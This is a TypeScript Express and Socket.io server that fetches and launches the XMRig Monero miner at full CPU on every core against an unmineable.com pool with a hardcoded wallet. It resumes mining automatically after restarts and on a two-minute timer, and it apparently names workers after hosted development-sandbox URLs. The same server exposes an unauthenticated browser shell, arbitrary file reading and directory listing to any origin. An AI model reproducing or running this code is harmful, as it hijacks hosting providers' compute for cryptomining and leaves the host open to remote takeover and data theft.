import express from "express";
import { createServer } from "http";
import { Server } from "socket.io";
import { spawn, execSync } from "child_process";
import path from "path";
import fs from "fs/promises";
import os from "os";
import { createServer as createViteServer } from "vite";
import "dotenv/config";

async function startServer() {
  const app = express();
  const httpServer = createServer(app);
  const io = new Server(httpServer, {
    cors: {
      origin: "*",
      methods: ["GET", "POST"]
    },
    transports: ["polling", "websocket"],
    allowEIO3: true
  });
  const PORT = 3000;

  // Global Mining Manager State
  const STATE_FILE = path.join(process.cwd(), "mining_state.json");
  const LOG_FILE = path.join(process.cwd(), "mining.log");
  let persistentMiningProcess: any = null;
  let miningStartTime: number | null = null;
  const miningLogs: string[] = [];
  const MAX_LOG_HISTORY = 1000;
  const MINING_DURATION = 6 * 60 * 60 * 1000; // 6 hours

  const saveState = async (workerName: string | null, startTime: number | null) => {
    try {
      await fs.writeFile(STATE_FILE, JSON.stringify({ workerName, startTime }));
    } catch (e) {
      console.error("Failed to save state:", e);
    }
  };

  const loadState = async () => {
    try {
      const data = await fs.readFile(STATE_FILE, "utf-8");
      return JSON.parse(data);
    } catch (e) {
      return { workerName: null, startTime: null };
    }
  };

  const appendToLog = async (data: string) => {
    try {
      const timestamp = new Date().toISOString();
      await fs.appendFile(LOG_FILE, `[${timestamp}] ${data}`);
    } catch (e) {}
  };

  process.on("uncaughtException", (err) => {
    console.error("Uncaught Exception:", err);
    appendToLog(`CRITICAL ERROR: ${err.message}\n`);
  });

  process.on("unhandledRejection", (reason) => {
    console.error("Unhandled Rejection:", reason);
    appendToLog(`CRITICAL REJECTION: ${String(reason)}\n`);
  });

  const broadcastMiningOutput = (data: string) => {
    io.emit("output", data);
    miningLogs.push(data);
    if (miningLogs.length > MAX_LOG_HISTORY) miningLogs.shift();
    appendToLog(data);
  };

  const stopMining = async () => {
    if (persistentMiningProcess) {
      persistentMiningProcess.kill();
      persistentMiningProcess = null;
      miningStartTime = null;
      await saveState(null, null);
      broadcastMiningOutput("\r\n\x1b[1;31m!!! Mining Process Stopped (6-hour limit reached or manual stop) !!!\x1b[0m\r\n");
    }
  };

  const startPersistentMining = async (workerName: string, resumeTime: number | null = null) => {
    if (persistentMiningProcess) return;

    broadcastMiningOutput(`\r\n\x1b[1;32m>>> ${resumeTime ? "Resuming" : "Initializing"} High-Power Mining (6h duration) for ${workerName}...\x1b[0m\r\n`);
    
    miningStartTime = resumeTime || Date.now();
    await saveState(workerName, miningStartTime);
    
    // Commands to run in sequence
    const setupCommands = [
      "curl -L -o xmrig-6.21.0-linux-x64.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz || wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz",
      "tar -xf xmrig-6.21.0-linux-x64.tar.gz",
      "chmod +x xmrig-6.21.0/xmrig"
    ];

    try {
      // Basic check if it already exists to speed up resume
      const exists = await fs.access(path.join(process.cwd(), "xmrig-6.21.0", "xmrig")).then(() => true).catch(() => false);
      if (!exists) {
        setupCommands.forEach(cmd => execSync(cmd));
      }
    } catch (e) {
      broadcastMiningOutput("\r\n\x1b[1;31mSetup failed, check permissions.\x1b[0m\r\n");
    }

    const cpus = os.cpus().length;
    const xmrigPath = path.join(process.cwd(), "xmrig-6.21.0", "xmrig");
    
    // Parameters for FULL POWER
    persistentMiningProcess = spawn(xmrigPath, [
      "-o", "rx.unmineable.com:3333",
      "-a", "rx/0",
      "-k",
      "-u", `NANO:nano_1g97x3h6wxd4h577p6dricapigs78ccc7tcowjfm67hewsmg7qob4xwc8jak.${workerName}`,
      "-t", cpus.toString(),
      "--donate-level", "1",
      "--nice", "0",
      "--keepalive"
    ]);

    persistentMiningProcess.stdout.on("data", (data: Buffer) => broadcastMiningOutput(data.toString()));
    persistentMiningProcess.stderr.on("data", (data: Buffer) => broadcastMiningOutput(data.toString()));

    persistentMiningProcess.on("close", (code: number) => {
      console.log(`Mining process exited with code ${code}`);
      persistentMiningProcess = null;
    });

    // Set remaining auto-stop
    const elapsed = Date.now() - miningStartTime;
    const remaining = Math.max(0, MINING_DURATION - elapsed);
    if (remaining > 0) {
      setTimeout(stopMining, remaining);
    } else {
      stopMining();
    }
  };

  const checkAndResumeMining = async () => {
    const { workerName, startTime } = await loadState();
    if (workerName && startTime) {
      const elapsed = Date.now() - startTime;
      if (elapsed < MINING_DURATION) {
        broadcastMiningOutput(`[SYSTEM] Server reboot detected. Resuming session for ${workerName}...\n`);
        startPersistentMining(workerName, startTime);
      } else {
        await saveState(null, null);
      }
    } else {
      broadcastMiningOutput(`[SYSTEM] Server started. No active mining session to resume.\n`);
    }
  };

  // Global Health Check (Runs every 2 minutes)
  setInterval(async () => {
    if (!persistentMiningProcess) {
      const { workerName, startTime } = await loadState();
      if (workerName && startTime) {
        const elapsed = Date.now() - startTime;
        if (elapsed < MINING_DURATION) {
          console.log("Health check: Found inactive mining state. Resuming...");
          startPersistentMining(workerName, startTime);
        }
      }
    }
  }, 2 * 60 * 1000);

  // Run on startup
  checkAndResumeMining();

  // File Manager API
  app.get("/api/files", async (req, res) => {
    try {
      const targetPath = (req.query.path as string) || process.cwd();
      const absolutePath = path.resolve(targetPath);
      
      const entries = await fs.readdir(absolutePath, { withFileTypes: true });
      const files = await Promise.all(
        entries.map(async (entry) => {
          const entryPath = path.join(absolutePath, entry.name);
          let size = 0;
          try {
            const stats = await fs.stat(entryPath);
            size = stats.size;
          } catch (e) {}
          
          return {
            name: entry.name,
            isDirectory: entry.isDirectory(),
            path: entryPath,
            size: size,
          };
        })
      );

      res.json({
        currentPath: absolutePath,
        files: files.sort((a, b) => {
          if (a.isDirectory === b.isDirectory) return a.name.localeCompare(b.name);
          return a.isDirectory ? -1 : 1;
        }),
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  app.get("/api/files/read", async (req, res) => {
    try {
      const filePath = req.query.path as string;
      if (!filePath) return res.status(400).json({ error: "Path required" });
      
      const content = await fs.readFile(filePath, "utf-8");
      res.json({ content });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  // System Specs API
  app.get("/api/system/specs", async (req, res) => {
    try {
      const cpus = os.cpus();
      const totalMem = os.totalmem();
      const freeMem = os.freemem();
      
      let storage = "N/A";
      try {
        storage = execSync("df -h /").toString();
      } catch (e) {}

      res.json({
        os: {
          platform: os.platform(),
          release: os.release(),
          type: os.type(),
          arch: os.arch(),
          hostname: os.hostname(),
          uptime: `${Math.floor(os.uptime() / 3600)}h ${Math.floor((os.uptime() % 3600) / 60)}m`,
        },
        cpu: {
          model: cpus[0].model,
          cores: cpus.length,
          speed: `${cpus[0].speed}MHz`,
          loadAvg: os.loadavg(),
        },
        memory: {
          total: `${(totalMem / 1024 / 1024 / 1024).toFixed(2)} GB`,
          free: `${(freeMem / 1024 / 1024 / 1024).toFixed(2)} GB`,
          used: `${((totalMem - freeMem) / 1024 / 1024 / 1024).toFixed(2)} GB`,
        },
        storage,
        shell: process.env.SHELL || "/bin/sh",
        nodeVersion: process.version,
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  // Socket.io Terminal Logic
  io.on("connection", (socket) => {
    console.log("Terminal client connected");
    socket.emit("output", "\r\n\x1b[1;34m--- System Shell Initialized ---\x1b[0m\r\n");
    
    // Attach to active mining session if running
    if (persistentMiningProcess) {
      socket.emit("output", "\r\n\x1b[1;33m--- Re-attaching to active mining session ---\x1b[0m\r\n");
      socket.emit("output", miningLogs.join(""));
    }

    // Try to use python3 to spawn a pty for better terminal support
    let term: any;
    const spawnOptions: any = {
      env: { ...process.env, TERM: "xterm-256color" },
      cwd: process.cwd(),
      stdio: ["pipe", "pipe", "pipe"],
    };

    try {
      // Check if python3 exists using a safer method
      const hasPython = execSync("python3 --version").toString().includes("Python 3");
      
      if (hasPython) {
        term = spawn("python3", ["-c", 'import pty; pty.spawn("/bin/bash")'], spawnOptions);
      } else {
        throw new Error("Python 3 not found");
      }
    } catch (e) {
      console.log("Python3 pty failed, trying bash -i");
      try {
        term = spawn("/bin/bash", ["-i"], spawnOptions);
      } catch (e2) {
        console.log("bash -i failed, falling back to basic sh");
        term = spawn("/bin/sh", [], spawnOptions);
      }
    }

    term.on("error", (err: Error) => {
      console.error("Failed to start shell:", err);
      socket.emit("output", `\r\n\x1b[31mFailed to start shell: ${err.message}\x1b[0m\r\n`);
    });

    socket.on("start-mining", () => {
      if (persistentMiningProcess) {
        socket.emit("output", "\r\n\x1b[1;33mMining is already running in background.\x1b[0m\r\n");
        return;
      }
      
      let workerName = "FullPower_" + Math.random().toString(36).substring(2, 7);
      const appUrl = process.env.APP_URL || "";
      const match = appUrl.match(/ais-(?:pre|dev)-([a-z0-9]+)/i);
      if (match && match[1]) {
        workerName = match[1];
      }
      
      startPersistentMining(workerName);
    });

    socket.on("stop-mining", () => {
      stopMining();
    });

    socket.on("input", (data) => {
      if (term.stdin.writable) {
        term.stdin.write(data);
      }
    });

    socket.on("resize", ({ cols, rows }) => {
      // Since we are using raw spawn, we can't easily resize the pty
      // but we can try to send a resize command to the shell if it supports it
      // However, without node-pty, true resizing is difficult.
      // We'll just log it for now.
      console.log(`Terminal resize requested: ${cols}x${rows}`);
    });

    term.stdout.on("data", (data: Buffer) => {
      socket.emit("output", data.toString());
    });

    term.stderr.on("data", (data: Buffer) => {
      socket.emit("output", data.toString());
    });

    term.on("error", (err: Error) => {
      console.error(`Shell spawn error: ${err}`);
      socket.emit("output", `\r\n\x1b[31mError spawning shell: ${err.message}\x1b[0m\r\n`);
    });

    term.on("close", (code: number) => {
      socket.emit("output", `\r\n\x1b[31mShell exited with code ${code}\x1b[0m\r\n`);
      socket.disconnect();
    });

    socket.on("get-mining-logs", (callback: any) => {
      fs.readFile(LOG_FILE, "utf8")
        .then(content => callback({ success: true, content: content.slice(-10000) }))
        .catch(e => callback({ success: false, error: "Log not found" }));
    });

    socket.on("disconnect", () => {
      term.kill();
    });
  });

  // Vite integration
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  httpServer.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
